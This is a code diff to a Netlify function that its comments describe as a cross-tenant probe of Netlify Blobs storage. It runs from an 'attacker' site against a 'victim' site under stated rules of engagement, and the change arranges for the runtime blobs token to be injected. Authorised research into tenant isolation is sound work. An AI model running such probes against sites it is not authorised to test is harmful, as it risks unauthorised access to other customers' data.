@@ -1,6 +1,9 @@
 // Phase-2 Netlify Blobs cross-tenant probe. Runs in nl1's own function runtime.
 // The runtime blobs token NEVER leaves the runtime — only status codes + JWT claims returned.
 // Key-gated. RoE: own attacker (nl1) -> own victim (nl2, Abed's other account). Read + one benign write, cleaned up.
+// Static top-level require so the Netlify functions bundler detects @netlify/blobs
+// and injects NETLIFY_BLOBS_CONTEXT (the automatic runtime edge token) into this fn.
+const netlifyBlobs = require('@netlify/blobs');
 const KEY = "bl0bx7q2z9k4";
 const NL1 = "6f1e8c67-7bec-4c02-91f7-b0f8a6175aa6"; // jazzy-pika (this site)
 const NL2 = "a0364027-1082-4eb6-b5ab-8715007f97f8"; // foreign victim site (azizsayed360 team)
@@ -39,8 +42,7 @@ exports.handler = async (event) => {
   };
   let libToken=null, libEdge=null, libTemplate=null, libHeaders=null;
   try{
-    const mod = await import('@netlify/blobs');
-    const store = mod.getStore('recon-store');
+    const store = netlifyBlobs.getStore('recon-store');
     const k='libprobe-'+Date.now();
     await store.set(k,'hello-nl1');
     out.lib_setOK = true;
